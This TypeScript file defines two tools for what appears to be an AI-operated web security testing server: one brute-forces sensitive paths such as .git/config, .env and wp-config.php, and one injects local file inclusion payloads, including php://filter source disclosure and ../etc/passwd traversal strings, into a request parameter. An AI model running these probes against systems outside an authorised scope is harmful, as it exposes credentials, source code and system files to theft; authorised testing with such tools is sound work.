import { z } from 'zod'

import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { getActiveTarget } from '../../chrome-cdp'
import { repeaterSendRaw, buildRequestSpec, restoreMarker } from '../../repeater'
import { scopeBlockForUrl } from '../scope'
import { ok, err, errorMessage } from '../utils'

const DEFAULT_WORDLIST = [
  // VCS / backups
  '.git/HEAD',
  '.git/config',
  '.svn/entries',
  '.hg/store',
  '.bzr/branch/last-revision',
  // Editor swap files
  '.index.php.swp',
  '.index.html.swp',
  '.bak',
  '.old',
  '~',
  // Environment / config
  '.env',
  '.env.local',
  '.env.production',
  'config.php',
  'config.json',
  'composer.json',
  'composer.lock',
  'package.json',
  'package-lock.json',
  'yarn.lock',
  'pnpm-lock.yaml',
  'docker-compose.yml',
  'Dockerfile',
  'wp-config.php',
  // Server status / debug
  'server-status',
  'server-info',
  'phpinfo.php',
  'info.php',
  'test.php',
  'debug.php',
  // Ops / dev / health — unlinked endpoints a link-crawl never finds; often the
  // entry point for SSRF/debug (e.g. a /healthcheck?url= that curls an arg).
  'healthcheck',
  'healthcheck-dev',
  'health',
  'healthz',
  'livez',
  'readyz',
  'status',
  'metrics',
  'actuator',
  'actuator/health',
  'debug',
  'api',
  'api/health',
  'internal',
  'dev',
  // Common admin paths
  'admin/',
  'administrator/',
  'wp-admin/',
  'phpmyadmin/',
  // Sourcemap leaks
  'main.js.map',
  'app.js.map',
  'bundle.js.map',
  // Robots / sitemap
  'robots.txt',
  'sitemap.xml',
  'security.txt',
  '.well-known/security.txt'
]

/**
 * A probed path is interesting when its response differs from the app's "absent"
 * baseline (a random nonexistent path). This surfaces not just 2xx but an authed
 * 400 (`/healthcheck` wanting a param) or a proxy 403 (`/healthcheck-dev` behind
 * an ACL) on an unlinked endpoint — the entry point a link-crawl misses. Falls
 * back to the plain 2xx/3xx heuristic when the baseline probe itself failed.
 */
export function isInterestingStatus(status: number, baselineStatus: number): boolean {
  if (status === 0) return false
  if (baselineStatus > 0) return status !== baselineStatus
  return status >= 200 && status < 400 && status !== 301 && status !== 302
}

const LFI_TEMPLATES = [
  // php://filter source disclosure variants
  'php://filter/convert.base64-encode/resource=index',
  'php://filter/convert.base64-encode/resource=index.php',
  'php://filter/read=string.rot13/resource=index.php',
  // Path traversal
  '../../../etc/passwd',
  '....//....//....//etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd'
]

export function registerPathProbeTools(mcp: McpServer) {
  mcp.registerTool(
    'path_probe',
    {
      description:
        'Probe common backup/disclosure paths (.git/HEAD, .env, *.swp, server-status, sourcemaps, wp-config). Reports any path returning 200 / non-default response. Provide baseUrl OR use the active page origin.',
      inputSchema: {
        baseUrl: z.string().optional().describe('e.g. https://target.com/. Defaults to active origin.'),
        wordlist: z.array(z.string()).max(2000).optional().describe('Override the default path list (max 2000)'),
        concurrency: z.number().int().positive().max(20).optional().describe('Default 6'),
        useDefault: z
          .boolean()
          .optional()
          .describe('Merge user wordlist with builtin (default true)')
      }
    },
    async ({ baseUrl, wordlist, concurrency = 6, useDefault = true }) => {
      try {
        let origin = baseUrl
        if (!origin) {
          const target = getActiveTarget()
          if (!target) return err('no active page; supply baseUrl')
          const r = (await target.dbg.sendCommand('Runtime.evaluate', {
            expression: 'location.origin',
            returnByValue: true
          })) as { result: { value?: string } }
          origin = r.result.value
        }
        if (!origin) return err('could not resolve base URL')

        const base = origin.endsWith('/') ? origin : origin + '/'
        const paths = [...(wordlist ?? []), ...(useDefault ? DEFAULT_WORDLIST : [])]
        const queue = paths.map((p) => (p.startsWith('http') ? p : base + p.replace(/^\//, '')))
        // In-page fetch bypasses repeaterSendRaw, so check scope up front.
        for (const u of queue) {
          const scopeBlock = scopeBlockForUrl(u)
          if (scopeBlock) return err(scopeBlock)
        }

        const results: Array<{
          url: string
          status: number
          length: number
          contentType?: string
          interesting: boolean
        }> = []

        // Learn the "absent" response (404 on most apps, or a login 302/403 on a
        // gated one) so a real hidden path is one whose status differs from it.
        const probeStatus = async (u: string): Promise<number> => {
          const target = getActiveTarget()
          if (!target) return 0
          try {
            const r = (await target.dbg.sendCommand('Runtime.evaluate', {
              expression: `(async()=>{try{const r=await fetch(${JSON.stringify(u)},{credentials:'include',redirect:'manual'});await r.arrayBuffer();return r.status}catch(e){return 0}})()`,
              awaitPromise: true,
              returnByValue: true
            })) as { result: { value: number } }
            return r.result.value
          } catch {
            return 0
          }
        }
        const baselineStatus = await probeStatus(base + `__rever_absent_${Math.random().toString(36).slice(2)}`)

        const deadline = Date.now() + 120_000
        async function worker() {
          while (queue.length > 0) {
            if (Date.now() > deadline) break
            const u = queue.shift()
            if (!u) break
            try {
              const target = getActiveTarget()
              if (!target) break
              const expr = `(async () => {
                try {
                  const t0 = performance.now();
                  const r = await fetch(${JSON.stringify(u)}, { credentials: 'include', redirect: 'manual' });
                  const buf = await r.arrayBuffer();
                  return { status: r.status, length: buf.byteLength, ct: r.headers.get('content-type') || '' };
                } catch (e) { return { status: 0, length: 0, error: e.message, ct: '' }; }
              })()`
              const r = (await target.dbg.sendCommand('Runtime.evaluate', {
                expression: expr,
                awaitPromise: true,
                returnByValue: true
              })) as { result: { value: { status: number; length: number; ct: string } } }
              const v = r.result.value
              const interesting = isInterestingStatus(v.status, baselineStatus)
              results.push({
                url: u,
                status: v.status,
                length: v.length,
                contentType: v.ct,
                interesting
              })
            } catch (e) {
              results.push({ url: u, status: 0, length: 0, interesting: false })
            }
          }
        }
        await Promise.all(Array.from({ length: concurrency }, () => worker()))
        results.sort((a, b) => Number(b.interesting) - Number(a.interesting))

        return ok(
          JSON.stringify(
            {
              baseUrl: base,
              probed: results.length,
              interesting: results.filter((r) => r.interesting).length,
              results
            },
            null,
            2
          )
        )
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )

  mcp.registerTool(
    'lfi_probe',
    {
      description:
        'Try common LFI payloads (php://filter source disclosure, ../etc/passwd traversal) against a vulnerable URL parameter. The marker `§` is replaced with each payload.',
      inputSchema: {
        requestId: z.string().describe('Base requestId (must contain § marker in URL/body)'),
        payloads: z.array(z.string()).max(500).optional().describe('Override default LFI payloads (max 500)')
      }
    },
    async ({ requestId, payloads }) => {
      try {
        const spec = restoreMarker(buildRequestSpec(requestId, undefined))
        if (
          !spec.url.includes('§') &&
          !(spec.body ?? '').includes('§')
        ) {
          return err('marker § not found in request URL or body')
        }
        const list = payloads ?? LFI_TEMPLATES
        const results: Array<{ payload: string; status: number; length: number; preview: string }> = []
        for (const p of list) {
          const sub = {
            ...spec,
            url: spec.url.replaceAll('§', encodeURIComponent(p)),
            body: spec.body?.replaceAll('§', p)
          }
          const r = await repeaterSendRaw(sub)
          results.push({
            payload: p,
            status: r.status,
            length: r.bodyByteLength,
            preview: r.body.slice(0, 200)
          })
        }
        return ok(JSON.stringify(results, null, 2))
      } catch (e) {
        return err(errorMessage(e))
      }
    }
  )
}
